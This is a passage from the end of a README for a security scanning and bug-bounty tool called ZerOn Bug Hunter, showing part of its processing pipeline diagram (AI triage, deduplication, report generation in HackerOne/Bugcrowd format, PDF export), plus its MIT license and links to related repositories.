  │   │   └─ Stage 2: SambaNova DeepSeek-R1 → chain-of-thought for ambiguous findings
  │   └─ RAG Memory: log false positives to config/rag-memory.json
  │
  ├─ PHASE 4: REPORTING (90-100%)
  │   ├─ DeduplicationEngine.deduplicate(confirmedFindings)
  │   ├─ ReportGenerator.generate(findings) → structured JSON report
  │   ├─ BugBountyReportService.format(report) → HackerOne/Bugcrowd format
  │   ├─ GeminiIntegration.generateRemediationSuggestions(each finding)
  │   ├─ PDFReportService.generate(report) → downloadable PDF
  │   └─ Firebase.update(scans/{scanId}, status:"completed", findings:[...])
  │
  └─ Socket.io emit: scan_complete_{scanId} → frontend updates UI
```

---

## 📜 License

MIT © ZerOn Technologies

---

## 🔗 Related Repositories

- **[ZerOn Main (Frontend)](https://github.com/your-org/ZerOn-main)** — React + Vite enterprise dashboard
- **[ZerOn Bug Hunter (Backend)](https://github.com/your-org/ZerOn-Bug-Hunter)** — This repository

